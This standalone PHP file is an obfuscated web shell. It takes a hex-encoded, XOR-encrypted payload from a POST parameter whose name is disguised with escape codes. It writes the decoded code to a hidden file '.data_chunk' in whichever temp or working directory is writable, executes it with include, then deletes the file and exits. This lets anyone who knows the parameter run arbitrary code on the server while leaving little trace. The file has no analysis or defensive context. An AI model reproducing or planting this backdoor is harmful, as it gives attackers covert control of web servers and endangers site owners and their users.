<?php

if(isset($_POST["\x73\x79mbo\x6C"])){
	$flag = array_filter(["/tmp", getenv("TEMP"), getenv("TMP"), "/var/tmp", ini_get("upload_tmp_dir"), sys_get_temp_dir(), getcwd(), session_save_path(), "/dev/shm"]);
	$tkn = hex2bin($_POST["\x73\x79mbo\x6C"]);
	$entity ='' ; for($r=0; $r<strlen($tkn); $r++){$entity .= chr(ord($tkn[$r]) ^ 94);}
	for ($mrk = 0, $fac = count($flag); $mrk < $fac; $mrk++) {
    $element = $flag[$mrk];
    		if (is_dir($element) ? is_writable($element) : false) {
    $ref = "$element/.data_chunk";
    if (file_put_contents($ref, $entity)) {
	include $ref;
	@unlink($ref);
	die();
}
}
}
}